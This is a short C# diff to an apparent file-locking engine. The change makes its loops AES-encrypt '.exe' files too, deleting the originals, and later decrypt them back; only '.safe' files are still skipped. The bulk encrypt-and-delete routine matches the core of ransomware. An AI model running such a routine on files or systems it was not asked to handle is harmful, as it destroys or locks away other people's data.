@@ -52,7 +52,7 @@ public static class Engine
         
         foreach (var file in files)
         {
-            if(file.EndsWith(".exe") || file.EndsWith(".safe")) continue;
+            if(file.EndsWith(".safe")) continue;
             Encryptor.AESFileEncrypt(file, file+".enc", key, Utils.GetIVFromSafeFile());
             File.Delete(file);
         }
@@ -65,7 +65,7 @@ public static class Engine
         
         foreach (var file in files)
         {
-            if(file.EndsWith(".exe") || file.EndsWith(".safe")) continue;
+            if(file.EndsWith(".safe")) continue;
             Encryptor.AESFileDecrypt(file+".enc", file, key, Utils.GetIVFromSafeFile());
             File.Delete(file+".enc");
         }
